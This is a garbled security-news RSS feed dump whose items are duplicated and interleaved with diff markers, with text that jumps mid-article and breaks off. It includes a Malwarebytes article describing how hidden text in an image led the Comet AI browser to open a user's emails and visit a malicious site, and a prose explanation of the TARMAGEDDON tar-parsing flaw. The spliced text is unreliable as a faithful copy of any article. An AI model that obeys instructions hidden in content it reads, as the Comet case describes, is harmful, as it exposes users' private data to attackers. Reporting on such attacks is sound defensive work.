sending emails with an access request to the password vault as part of a legacy inheritance process. [...]]]></content:encoded></item><item><title>How to reduce costs with self-service password resets</title><link>https://www.bleepingcomputer.com/news/security/how-to-reduce-costs-with-self-service-password-resets/</link><author>Sponsored by Specops Software</author><category>security</category><pubDate>Fri, 24 Oct 2025 14:06:16 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Password resets account for nearly 40% of IT help desk calls, costing orgs time and money. Specops Software's uReset lets users securely reset passwords with flexible MFA options like Duo, Okta, and Yubikey while enforcing identity verification to stop misuse. [...]]]></content:encoded></item><item><title>APT36 Targets Indian Government with Golang-Based DeskRAT Malware Campaign</title><link>https://thehackernews.com/2025/10/apt36-targets-indian-government-with.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQlLDV9eHmX0UxtlV_GgmAOIgKuN8Ko4GLu13DsbfOsmXOvZCCfJFJYTu4bWeUaVoNQdQvqwitjs9X6gMRTAMc_42zGhH59sINyGokJo-7HwggyEP6v0NqKmiLlMHl2WDVoclCkkDXEAsE-ZN3Yz1ADcLXPV5vRtrIKTP07e87JvUg72soCwq2BwffNjbD/s1600/indian-cyberattack.jpg" length="" type=""/><pubDate>Fri, 24 Oct 2025 14:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[A Pakistan-nexus threat actor has been observed targeting Indian government entities as part of spear-phishing attacks designed to deliver a Golang-based malware known as DeskRAT.
 The activity, observed in August and September 2025 by Sekoia, has been attributed to Transparent Tribe (aka APT36), a state-sponsored hacking group known to be active since at least 2013. It also builds upon a prior]]></content:encoded></item><item><title>Is AI moving faster than its safety net?</title><link>https://www.malwarebytes.com/blog/news/2025/10/is-ai-moving-faster-than-its-safety-net</link><author></author><category>threatintel</category><pubDate>Fri, 24 Oct 2025 13:35:51 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[You’ve probably noticed that artificial intelligence, or AI, has been everywhere lately—news, phones, apps, even in your browser. It seems like everything suddenly wants to be “powered by AI.“ If it’s not, it’s considered old school and boring. It’s easy to get swept up in the promise: smarter tools, less work, and maybe even a glimpse of the future.But if we look at some of the things we learned just this week, that glimpse doesn’t only promise good things. There’s a quieter story running alongside the hype that you won’t see in the commercials. It’s the story of how AI’s rapid development is leaving security and privacy struggling to catch up.And if you make use of AI assistants, chatbots, or those “smart” AI browsers popping up on your screen, those stories are worth your attention.Are they smarter than us?Even some of the industry’s biggest names—Steve Wozniak, Sir Richard Branson, and Stuart Russel—are worried that progress in AI is moving too fast for its own good. In an article published by ZDNet, they talk about their fear of “superintelligence,” saying they’re afraid we’ll cross the line from “AI helps humans” to “AI acts beyond human control” before we’ve figured out how to keep it in check.These scenarios are not about killer robots or takeovers like in the movies. They’re about much smaller, subtler problems that add up. For example, an AI system designed to make customer service more efficient might accidentally share private data because it wasn’t trained to understand what’s confidential. Or an AI tool designed to optimize web traffic might quietly break privacy laws it doesn’t comprehend.At the scale we use AI—billions of interactions per day—these oversights become serious. The problem isn’t that AI is malicious; it’s that it doesn’t understand consequences, and developers forget to set boundaries.We’re already struggling to build basic online safety into the AI tools that are replacing our everyday ones.AI browsers: too smart, too soonAI browsers—and their newer cousin, the ‘agentic’ browser—do more than just display websites. They can read them, summarize them, and even perform tasks for you.A browser that can search, write, and even act on your behalf sounds great—but you may want to rethink that. According to research reported by Futurism, some of these tools are being rolled out with deeply worrying security flaws.Here’s the issue: many AI browsers are just as vulnerable to prompt injection as AI chatbots. The difference is that if you give an AI browser a task, it runs off on its own and you have little control over what it reads or where it goes. Take Comet, a browser developed by the company Perplexity. Researchers at Brave found that Comet’s “AI assistant” could be tricked into doing harmful things simple because it trusted what it saw online. In one test, researchers showed the browser a seemingly innocent image. Hidden inside that image was a line of invisible text—something no human would see, but instructions meant only for the AI. The browser followed the hidden commands and ended up opening personal emails and visiting a malicious website.In short, the AI couldn’t tell the difference between a user’s request and an attacker’s disguised instructions. That is a typical example of a prompt injection attack, which works a bit like phishing for machines. Instead of tricking a person into clicking a bad link, it tricks an AI browser into doing it for you. Without the realization of “oops, maybe I shouldn’t have done that,” it is faster, quiet, and with access you might not even realize it has.The AI has no idea it did something wrong. It’s just following orders, doing exactly what it was programmed to do. It doesn’t know which instructions are bad because nobody taught it how to tell the difference.Even if the AI engine itself worked perfectly, attackers have another way in: fake interfaces.According to BleepingComputer, scammers are already creating spoofed AI sidebars that look identical to genuine ones from browsers like OpenAI’s Atlas and Perplexity’s Comet. These fake sidebars mimic the real interface, making them almost impossible to spot. Picture this: you open your browser, see what looks like your trusted AI helper, and ask it a question. But instead of the AI assistant helping you, it’s quietly recording every word you type.Some of these fake sidebars even persuade users to “verify” credentials or “authorize” a quick fix. This is social engineering in a new disguise. The scammer doesn’t need to lure you away from the page, they just need to convince you that the AI you’re chatting with is legitimate. Once that trust is earned, the damage is done.And since AI tools are designed to sound helpful, polite, and confident, most people will take their word for it. After all, if an AI browser says, “Don’t worry, this is safe to click,” who are you to argue?The key problem right now is speed. We keep pushing the limits of what AI can do faster than we can make it safe. The next big problem will be the data these systems are trained on.As long as we keep chasing the newest features, companies will keep pushing for more options and integrations—whether or not they’re ready. They’ll teach your fridge to track your diet if they think you’ll buy it.As consumers, the best thing we can do is stay informed about new developments and the risks that come with them. Ask yourself: Do I really need this? What am I trusting it with? What’s the potential downside? Sometimes it’s worth doing things the slower, safer way.Pro tip: I installed Malwarebytes’ Browser Guard on Comet, and it seems to be working fine so far. I’ll keep you posted on that.We don’t just report on threats – we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline. Protect your—and your family’s—personal information by using identity protection.]]></content:encoded></item><item><title>NCSC waarschuwt voor actief misbruik van kritiek Windows Server-lek</title><link>https://www.security.nl/posting/910448/NCSC+waarschuwt+voor+actief+misbruik+van+kritiek+Windows+Server-lek?channel=rss</link><author></author><category>security</category><pubDate>Fri, 24 Oct 2025 13:21:00 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
-            Het Nationaal Cyber Security Centrum (NCSC) waarschuwt voor actief misbruik van een kritieke kwetsbaarheid in Windows Server waarvoor Microsoft gisteren een noodpatch uitbracht. Via het beveiligingsle ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Mozilla: New Firefox extensions must disclose data collection practices</title><link>https://www.bleepingcomputer.com/news/software/mozilla-new-firefox-extensions-must-disclose-data-collection-practices/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 24 Oct 2025 13:17:00 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Starting next month, Mozilla will require Firefox extension developers to disclose whether their add-ons collect or share user data with third parties. [...]]]></content:encoded></item><item><title>ModMed revealed they were victims of a cyberattack in July. Then some data showed up for sale.</title><link>https://databreaches.net/2025/10/24/modmed-revealed-they-were-victims-of-a-cyberattack-in-july-then-some-data-showed-up-for-sale/?pk_campaign=feed&amp;pk_kwd=modmed-revealed-they-were-victims-of-a-cyberattack-in-july-then-some-data-showed-up-for-sale</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 24 Oct 2025 12:54:56 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Toys “R” Us Canada customers notified of breach of personal information</title><link>https://databreaches.net/2025/10/24/toys-r-us-canada-customers-notified-of-breach-of-personal-information/?pk_campaign=feed&amp;pk_kwd=toys-r-us-canada-customers-notified-of-breach-of-personal-information</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 24 Oct 2025 12:28:28 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Gatineau gymnastics centre warns members of possible data breach</title><link>https://databreaches.net/2025/10/24/gatineau-gymnastics-centre-warns-members-of-possible-data-breach/?pk_campaign=feed&amp;pk_kwd=gatineau-gymnastics-centre-warns-members-of-possible-data-breach</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 24 Oct 2025 12:28:17 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Data breach in 42 Latvian municipalities: DVI imposes 300,000 euro fine on ZZ Dats</title><link>https://databreaches.net/2025/10/24/data-breach-in-42-latvian-municipalities-dvi-imposes-300000-euro-fine-on-zz-dats/?pk_campaign=feed&amp;pk_kwd=data-breach-in-42-latvian-municipalities-dvi-imposes-300000-euro-fine-on-zz-dats</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 24 Oct 2025 12:28:06 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Confidence in ransomware recovery is high but actual success rates remain low</title><link>https://databreaches.net/2025/10/24/confidence-in-ransomware-recovery-is-high-but-actual-success-rates-remain-low/?pk_campaign=feed&amp;pk_kwd=confidence-in-ransomware-recovery-is-high-but-actual-success-rates-remain-low</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 24 Oct 2025 12:27:58 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Microsoft drops surprise Windows Server patch before weekend downtime</title><link>https://go.theregister.com/feed/www.theregister.com/2025/10/24/windows_server_patch/</link><author></author><category>security</category><pubDate>Fri, 24 Oct 2025 12:16:26 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
-            Microsoft has released an out-of-band update to patch a critical vulnerability in Windows Server Update Services (WSUS).
-The update addresses CVE-2025-59287">CVE-2025-59287, a remote code execution fl ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Microsoft releases urgent fix for actively exploited WSUS vulnerability (CVE-2025-59287)</title><link>https://www.helpnetsecurity.com/2025/10/24/wsus-vulnerability-cve-2025-59287-exploited/</link><author></author><category>security</category><pubDate>Fri, 24 Oct 2025 11:50:37 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Microsoft releases urgent fix for actively exploited WSUS vulnerability (CVE-2025-59287)]]></content:encoded></item><item><title>Part Four of The Kryptos Sculpture</title><link>https://www.schneier.com/blog/archives/2025/10/part-four-of-the-kryptos-sculpture.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Fri, 24 Oct 2025 11:01:14 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[Two people found the solution. They used the power of research, not cryptanalysis, finding clues amongst the Sanborn papers at the Smithsonian’s Archives of American Art.This comes as an awkward time, as Sanborn is auctioning off the solution. There were legal threats—I don’t understand their basis—and the solvers are not publishing their solution.]]></content:encoded></item><item><title>The Cybersecurity Perception Gap: Why Executives and Practitioners See Risk Differently</title><link>https://thehackernews.com/2025/10/the-cybersecurity-perception-gap-why.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQVzc_sr-XqhPEurqyN5PP7oW8LrIPQ8ry9ijkZAGE-YdWZRsYhhcP52iWxJ1buNw0vzuaCSDTTfgJO-lAX3YIhKL0abx2Szo9WprfdIFCIu0Hy1dvtpnfuAgxxkwksq1HTI2t1t9zm2sqi6JaqwejgaalOVD1NuQYhCHRXcoVMXwGvMzxviIfrto0MwE/s1600/bd-main.jpg" length="" type=""/><pubDate>Fri, 24 Oct 2025 11:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Does your organization suffer from a cybersecurity perception gap? Findings from the Bitdefender 2025 Cybersecurity Assessment suggest the answer is probably “yes” — and many leaders may not even realize it.
+            Het Nationaal Cyber Security Centrum (NCSC) waarschuwt voor actief misbruik van een kritieke kwetsbaarheid in Windows Server waarvoor Microsoft gisteren een noodpatch uitbracht. Via het beveiligingsle ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Mozilla: New Firefox extensions must disclose data collection practices</title><link>https://www.bleepingcomputer.com/news/software/mozilla-new-firefox-extensions-must-disclose-data-collection-practices/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 24 Oct 2025 13:17:00 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Starting next month, Mozilla will require Firefox extension developers to disclose whether their add-ons collect or share user data with third parties. [...]]]></content:encoded></item><item><title>ModMed revealed they were victims of a cyberattack in July. Then some data showed up for sale.</title><link>https://databreaches.net/2025/10/24/modmed-revealed-they-were-victims-of-a-cyberattack-in-july-then-some-data-showed-up-for-sale/?pk_campaign=feed&amp;pk_kwd=modmed-revealed-they-were-victims-of-a-cyberattack-in-july-then-some-data-showed-up-for-sale</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 24 Oct 2025 12:54:56 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Toys “R” Us Canada customers notified of breach of personal information</title><link>https://databreaches.net/2025/10/24/toys-r-us-canada-customers-notified-of-breach-of-personal-information/?pk_campaign=feed&amp;pk_kwd=toys-r-us-canada-customers-notified-of-breach-of-personal-information</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 24 Oct 2025 12:28:28 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Gatineau gymnastics centre warns members of possible data breach</title><link>https://databreaches.net/2025/10/24/gatineau-gymnastics-centre-warns-members-of-possible-data-breach/?pk_campaign=feed&amp;pk_kwd=gatineau-gymnastics-centre-warns-members-of-possible-data-breach</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 24 Oct 2025 12:28:17 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Data breach in 42 Latvian municipalities: DVI imposes 300,000 euro fine on ZZ Dats</title><link>https://databreaches.net/2025/10/24/data-breach-in-42-latvian-municipalities-dvi-imposes-300000-euro-fine-on-zz-dats/?pk_campaign=feed&amp;pk_kwd=data-breach-in-42-latvian-municipalities-dvi-imposes-300000-euro-fine-on-zz-dats</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 24 Oct 2025 12:28:06 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Confidence in ransomware recovery is high but actual success rates remain low</title><link>https://databreaches.net/2025/10/24/confidence-in-ransomware-recovery-is-high-but-actual-success-rates-remain-low/?pk_campaign=feed&amp;pk_kwd=confidence-in-ransomware-recovery-is-high-but-actual-success-rates-remain-low</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 24 Oct 2025 12:27:58 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Part Four of The Kryptos Sculpture</title><link>https://www.schneier.com/blog/archives/2025/10/part-four-of-the-kryptos-sculpture.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Fri, 24 Oct 2025 11:01:14 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[Two people found the solution. They used the power of research, not cryptanalysis, finding clues amongst the Sanborn papers at the Smithsonian’s Archives of American Art.This comes as an awkward time, as Sanborn is auctioning off the solution. There were legal threats—I don’t understand their basis—and the solvers are not publishing their solution.]]></content:encoded></item><item><title>The Cybersecurity Perception Gap: Why Executives and Practitioners See Risk Differently</title><link>https://thehackernews.com/2025/10/the-cybersecurity-perception-gap-why.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQVzc_sr-XqhPEurqyN5PP7oW8LrIPQ8ry9ijkZAGE-YdWZRsYhhcP52iWxJ1buNw0vzuaCSDTTfgJO-lAX3YIhKL0abx2Szo9WprfdIFCIu0Hy1dvtpnfuAgxxkwksq1HTI2t1t9zm2sqi6JaqwejgaalOVD1NuQYhCHRXcoVMXwGvMzxviIfrto0MwE/s1600/bd-main.jpg" length="" type=""/><pubDate>Fri, 24 Oct 2025 11:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Does your organization suffer from a cybersecurity perception gap? Findings from the Bitdefender 2025 Cybersecurity Assessment suggest the answer is probably “yes” — and many leaders may not even realize it.
 This disconnect matters. Small differences in perception today can evolve into major blind spots tomorrow. After all, perception influences what organizations prioritize, where they]]></content:encoded></item><item><title>3,000 YouTube Videos Exposed as Malware Traps in Massive Ghost Network Operation</title><link>https://thehackernews.com/2025/10/3000-youtube-videos-exposed-as-malware.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhh8EaTq-s91jlucVVZYpqJYdk5xQXEy0ylAf-poP2YIxboYThJyShnGQwhh-OORfMy6LnRQlwQfzHP2bf8Ao0JyihddLTI6G4fcLdnxktdgM8vE_02iM1LFvJCgmafz56dDvXjyDLXMWkE8-RxezA8kCpkn4heiMnIZT7pZp72rQXIa00u9YAJadnsKxUm/s1600/youtube.jpg" length="" type=""/><pubDate>Fri, 24 Oct 2025 10:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[A malicious network of YouTube accounts has been observed publishing and promoting videos that lead to malware downloads, essentially abusing the popularity and trust associated with the video hosting platform for propagating malicious payloads.
 Active since 2021, the network has published more than 3,000 malicious videos to date, with the volume of such videos tripling since the start of the]]></content:encoded></item><item><title>Windows Server emergency patches fix WSUS bug with PoC exploit</title><link>https://www.bleepingcomputer.com/news/security/microsoft-releases-windows-server-emergency-updates-for-critical-wsus-rce-flaw/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 24 Oct 2025 07:27:56 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft has released out-of-band (OOB) security updates to patch a critical-severity Windows Server Update Service (WSUS) vulnerability with publicly available proof-of-concept exploit code. [...]]]></content:encoded></item><item><title>Self-Spreading &apos;GlassWorm&apos; Infects VS Code Extensions in Widespread Supply Chain Attack</title><link>https://thehackernews.com/2025/10/self-spreading-glassworm-infects-vs.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEghcP3Kooks9KjeygfquG2lCkBRvM1V9_zlYuOlz1vXhgU_qDiAErqbPmukvMP6fFUYJzqjCB5xavFDH8WzPA350BLCWwMXU88eP-ReBZWQGo9sfbgoh_3e5Gw_bp6cuJ2O1vercvYxepJppsOAXPuwK-R4v4WYjmKyYQ1_CpEkUSHEGlpJQu5gQYlFQIZ1/s1600/code-vscode.jpg" length="" type=""/><pubDate>Fri, 24 Oct 2025 07:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have discovered a self-propagating worm that spreads via Visual Studio Code (VS Code) extensions on the Open VSX Registry and the Microsoft Extension Marketplace, underscoring how developers have become a prime target for attacks.
 The sophisticated threat, codenamed GlassWorm by Koi Security, is the second such supply chain attack to hit the DevOps space within a span]]></content:encoded></item><item><title>TARMAGEDDON (CVE-2025-62518): RCE Vulnerability Highlights the challenges of open source abandonware</title><link>https://edera.dev/stories/tarmageddon</link><author>/u/ukindom</author><category>netsec</category><pubDate>Fri, 24 Oct 2025 06:40:55 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[This vulnerability impacts major, widely-used projects, including uv (Astral's lightning-fast Python package manager), , and . Due to the widespread nature of  in various forms, it is not possible to truly quantify upfront the blast radius of this bug across the ecosystem.Our suggested remediation is to immediately upgrade to one of the patched versions or remove this dependency. If you depend on , consider migrating to an actively maintained fork like . In addition, the Edera fork  will be archived to coalesce all efforts with the astral fork and reduce the ecosystem confusion.The Challenge of Abandonware: A Decentralized Responsible DisclosureThis vulnerability disclosure was uniquely challenging because the most popular fork (, with over 5 million downloads on crates.io) appears to be abandonware – no longer actively maintained.In a standard disclosure, a single patch is applied to the main upstream repository, and all downstream users inherit the fix. Because we could not rely on the original project maintainers to apply the fix, we were forced to coordinate a decentralized disclosure across a deep and complex fork lineage: (Root) ➡️  (Most popular fork, abandoned) ➡️ (Originally maintained by Edera, now archived) ➡️ (Actively maintained by Astral)Instead of a single point of contact, we had to:Develop patches for the upstream versions.Identify and reach out to the maintainers of the unmaintained upstream repositories ( and ). Neither project had a SECURITY.md or public contact method, so it required some social engineering and community sleuthing to locate the right maintainers. Individually contact the maintainers of the two most active forks ( and ) and coordinate simultaneous patching under a strict 60-day embargo.Proactively reach out to major downstream projects (including , , , and ) to ensure they were ready to upgrade immediately upon disclosure.This process required significantly more effort and time than a typical disclosure, underscoring the severe challenges and inefficiency of ensuring wide-scale patching when critical vulnerabilities are found in popular, yet abandoned, open-source dependencies.Downstream Project Coordination ResultsBinstalk: Plan to eliminate dependency or switch to patched  due to small attack surface.Opa-wasm: Not affected, as they do not use the vulnerable unpacking/extraction-to-path functionality.Other projects were made aware of the upcoming patch and have not responded to our attempts at outreach. Furthermore, there are likely several downstream projects relying on impacted versions that we are not aware of. Technical Overview & Analysis This vulnerability is a desynchronization flaw that allows an attacker to "smuggle" additional archive entries into TAR extractions. It occurs when processing nested TAR files that exhibit a specific mismatch between their PAX extended headers and ustar headers.The flaw stems from the parser's inconsistent logic when determining file data boundaries:A file entry has both PAX and ustar headers.The PAX header correctly specifies the actual file size (, e.g., 1MB).The ustar header incorrectly specifies zero size ().The vulnerable  parser incorrectly advances the stream position based on the ustar size (0 bytes) instead of the PAX size (X bytes).By advancing 0 bytes, the parser fails to skip over the actual file data (which is a nested TAR archive) and immediately encounters the next valid TAR header located at the start of the nested archive. It then incorrectly interprets the inner archive's headers as legitimate entries belonging to the outer archive.File overwriting attacks within extraction directories.Supply chain attacks via build system and package manager exploitation.Bill-of-materials (BOM) bypass for security scanning.Vulnerable Processing (PAX size=X, ustar size=0):The result seen by the parser: Actually extracted by tokio-tar:
@@ -4808,5 +5767,4 @@ The 131 spamware extensions share the same codebase, design patterns, and infras
 The Ministry of State Security (MSS), in a WeChat post, said it uncovered "irrefutable evidence" of the agency's involvement in the intrusion]]></content:encoded></item><item><title>Navigating Your Threat Intelligence Maturity Journey</title><link>https://www.recordedfuture.com/blog/navigating-your-threat-intelligence-maturity-journey</link><author></author><category>threatintel</category><enclosure url="https://www.recordedfuture.com/blog/media_1f6ac9cee9a486fb9ce3a44eb5022a60f1b6814ba.png?width=1200&amp;format=pjpg&amp;optimize=medium" length="" type=""/><pubDate>Mon, 20 Oct 2025 00:00:00 +0000</pubDate><source url="https://www.recordedfuture.com/">Recorded Future</source><content:encoded><![CDATA[Every security leader wants to maximize the value of their threat intelligence program. For some, that means building toward world-class capabilities: becoming proactive rather than reactive, anticipating threats before they materialize, and achieving autonomous operations. For others, it means optimizing their current capabilities to deliver the best possible outcomes at their present stage, aligning their program with their organization's risk profile and strategic priorities.But here's the challenge: most organizations don't have a clear picture of what "good" actually looks like for their situation. They don't know which improvements will deliver the most value at their current stage, or what specific steps will take them where they want to go. Without this clarity, security teams struggle to prioritize investments, demonstrate ROI to leadership, and chart an effective path forward.That's why we've developed the Recorded Future Threat Intelligence Maturity Journey and free interactive assessment, a comprehensive framework designed to help security organizations understand their current threat intelligence capabilities and navigate a strategic path forward.Understanding the Threat Intelligence Maturity JourneyA truly valuable maturity framework does more than just label where you are today. It provides a holistic view of your entire threat intelligence operation and offers practical guidance for improvement. It has three main components:: The most effective maturity assessments evaluate threat intelligence programs across multiple critical dimensions. A comprehensive view requires looking at your people (team structure, skills, and organizational positioning), your processes (intelligence requirements, collection strategies, and operational workflows), and your technology (platform capabilities, integrations, and level of automation).The right recommendations: A maturity framework needs to provide actionable guidance tailored to your specific situation. What works for an advanced program can overwhelm a foundational one, while basic recommendations fail to challenge organizations ready for sophisticated capabilities.: Organizations progress through four distinct stages on their threat intelligence journey: Reactive, Proactive, Predictive, and Autonomous. Each stage represents a fundamental shift in how threat intelligence is collected, analyzed, and operationalized. The next section will go into the stages in more detail.The Four Stages of Threat Intelligence MaturityIt is important to understand each stage and how they differ. Each stage represents a fundamental shift in how threat intelligence is collected, analyzed, and operationalized.Stage 1: Reactive IntelligenceResponding to threats after detectionOrganizations in the Reactive stage are establishing essential threat intelligence capabilities. They have critical building blocks taking shape: teams are consuming threat intelligence, starting to enrich their alerts with meaningful context, and integrating intelligence sources with their existing security tools. Their team’s skills required to turn raw data into actionable insights are developing, though there's significant room for improvement.: Reducing mean time to detection (MTTD) and mean time to containment (MTTC) by enriching telemetry with basic threat context.Stage 2: Proactive IntelligenceOrganizations reaching the Proactive stage are evolving beyond basic response to proactive threat hunting and actor understanding. They're streamlining intelligence workflows and building reporting mechanisms to demonstrate program value. These teams are catching known threats effectively, with the opportunity to achieve greater ROI by identifying emerging threats early.: Preventing known threats from materializing and beginning to understand the broader threat landscape relevant to their industry and geography.Stage 3: Predictive IntelligenceAnticipating threats before they materializeOrganizations at the Predictive stage have achieved strategic threat intelligence capabilities. They're predicting emerging threats with AI-powered analysis and strategic intelligence that drives enterprise-wide risk decisions. Their coverage spans cyber threats, digital risk, supply chain security, and geopolitical factors.: Having a comprehensive view of the threat landscape, seeing threats from an attacker's perspective, and anticipating what's coming before becoming a target.Stage 4: Autonomous IntelligenceSelf-directing threat response with minimal human interventionOrganizations achieving Autonomous Intelligence have reached world-class status. They've implemented autonomous threat detection, analysis, and response capabilities with expert teams and AI working in harmony. Continuous hunting, prevention, and detection operate at the pinnacle of intelligence operationalization.: Threat intelligence is fully operationalized across systems, enabling autonomous actions that replace manual hunting and scale operations without requiring specialized expertise for every task.Discovering Your Position on the Maturity JourneyOur  evaluates your organization across all three dimensions (people, process, and technology) through nine targeted questions. The assessment takes just a few minutes to complete and can deliver immediate value.Your current maturity stage with a clear explanation of what it meansStage-specific recommendations tailored to your organization's capabilitiesA strategic roadmap outlining the steps needed to advance to the next maturity levelActionable guidance on where to focus next for maximum impactWhy Your Maturity Stage MattersKnowing where you stand on the maturity journey enables you to:Make informed investment decisions: Focus resources on capabilities that will deliver the greatest impact at your current stage rather than investing in advanced capabilities your organization may not be ready to operationalize.Demonstrate program value: Articulate your program's evolution to leadership using a recognized framework that shows both current achievements and a clear path forward.Build a strategic roadmap: Prioritize initiatives that build on your existing strengths while addressing opportunities to advance or that will maximize effectiveness at your current level.Whether you're working to establish foundational capabilities, optimizing outcomes at your current level, or building toward autonomous operations, understanding your current position is essential to strategic decision-making.Ready to discover where your threat intelligence program stands?Take our free Threat Intelligence Maturity Assessment and receive your personalized roadmap to more effective threat intelligence operations. In just a few minutes, you'll gain the clarity needed to prioritize your next steps and accelerate your journey toward the outcomes that matter most to your organization.]]></content:encoded></item><item><title>Truffle Security Co. TruffleHog git arbitrary code execution vulnerability</title><link>https://talosintelligence.com/vulnerability_reports/TALOS-2025-2243</link><author>(Dayzerosec.com)</author><category>vulns</category><pubDate>Sun, 19 Oct 2025 23:59:32 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[This website is using a security service to protect itself from online attacks. The action you just performed triggered the security solution. There are several actions that could trigger this block including submitting a certain word or phrase, a SQL command or malformed data.
 
 You can email the site owner to let them know you were blocked. Please include what you were doing when this page came up and the Cloudflare Ray ID found at the bottom of this page.]]></content:encoded></item><item><title>ISC Stormcast For Monday, October 20th, 2025 https://isc.sans.edu/podcastdetail/9662, (Sun, Oct 19th)</title><link>https://isc.sans.edu/diary/rss/32382</link><author></author><category>threatintel</category><pubDate>Sun, 19 Oct 2025 19:45:21 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>UK: ‘Catastrophic’ attack as Russians hack files on EIGHT MoD bases and post them on the dark web</title><link>https://databreaches.net/2025/10/19/uk-catastrophic-attack-as-russians-hack-files-on-eight-mod-bases-and-post-them-on-the-dark-web/?pk_campaign=feed&amp;pk_kwd=uk-catastrophic-attack-as-russians-hack-files-on-eight-mod-bases-and-post-them-on-the-dark-web</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 19 Oct 2025 15:58:32 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>A business’s cyber insurance policy included ransom coverage, but when they needed it, the insurer refused to pay. Why?</title><link>https://databreaches.net/2025/10/19/a-businesss-cyber-insurance-policy-included-ransom-coverage-but-when-they-needed-it-the-insurer-refused-to-pay-why/?pk_campaign=feed&amp;pk_kwd=a-businesss-cyber-insurance-policy-included-ransom-coverage-but-when-they-needed-it-the-insurer-refused-to-pay-why</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 19 Oct 2025 13:40:12 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Europol Dismantles SIM Farm Network Powering 49 Million Fake Accounts Worldwide</title><link>https://thehackernews.com/2025/10/europol-dismantles-sim-farm-network.html</link><author>The Hacker News</author><category>security</category><enclosure 